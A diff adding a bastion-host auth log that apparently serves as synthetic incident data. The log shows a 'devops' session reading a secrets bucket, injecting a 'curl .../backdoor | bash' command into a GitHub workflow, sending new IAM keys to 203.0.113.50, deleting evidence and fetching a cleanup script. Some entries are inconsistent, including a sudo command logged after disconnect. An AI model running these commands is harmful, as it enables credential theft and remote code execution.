@@ -1,0 +1,19 @@
+Jul 28 18:00:00 bastion-host sshd[15010]: Accepted publickey for devops from 203.0.113.50 port 61001 ssh2
+Jul 28 18:00:02 bastion-host sshd[15010]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Jul 28 18:00:30 bastion-host sudo[15015]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/aws sts get-caller-identity
+Jul 28 18:00:45 bastion-host sudo[15020]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/aws s3 ls s3://production-secrets-bucket
+Jul 28 18:00:50 bastion-host sudo[15021]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/aws s3 cp s3://production-secrets-bucket/env.json /tmp/env.json
+Jul 28 18:01:00 bastion-host sudo[15025]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/bin/cat /tmp/env.json
+Jul 28 18:01:15 bastion-host sudo[15030]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/aws ec2 describe-instances --region us-east-1
+Jul 28 18:01:30 bastion-host sudo[15035]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/aws ec2 describe-security-groups --region us-east-1
+Jul 28 18:02:00 bastion-host sudo[15040]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/aws rds describe-db-instances --region us-east-1
+Jul 28 18:02:30 bastion-host sudo[15045]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/aws lambda list-functions --region us-east-1
+Jul 28 18:03:00 bastion-host sudo[15050]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/curl -X POST -H "Authorization: Bearer $(cat /tmp/env.json | jq -r '.GITHUB_TOKEN')" https://api.github.com/repos/org/production- infra/actions/workflows
+Jul 28 18:03:30 bastion-host sudo[15055]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/curl -X POST -H "Content-Type: application/json" -d "{\"ref\":\"main\",\"inputs\":{\"command\":\"curl -s http://203.0.113.50:8000/backdoor | bash\"}}" "https://api.github.com/repos/org/production-infra/actions/workflows/deploy.yml/dispatches"
+Jul 28 18:04:00 bastion-host sudo[15060]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/aws iam create-access-key --user-name devops --region us-east-1
+Jul 28 18:04:15 bastion-host sudo[15065]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/curl -X POST -d "access_key=$(aws iam list-access-keys --user-name devops --query 'AccessKeyMetadata[0].AccessKeyId' --output text)&secret_key=$(aws iam create-access-key --user-name devops --query 'AccessKey.SecretAccessKey' --output text)" http://203.0.113.50:8000/keys
+Jul 28 18:04:30 bastion-host sudo[15070]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/aws s3 rm s3://production-secrets-bucket/env.json
+Jul 28 18:05:00 bastion-host sudo[15075]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/bin/rm -f /tmp/env.json
+Jul 28 18:05:30 bastion-host sshd[15080]: Received disconnect from 203.0.113.50: disconnected by user
+Jul 28 18:05:31 bastion-host sshd[15080]: pam_unix(sshd:session): session closed for user devops
+Jul 28 18:06:00 bastion-host sudo[15085]:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.50:8000/cleanup | bash
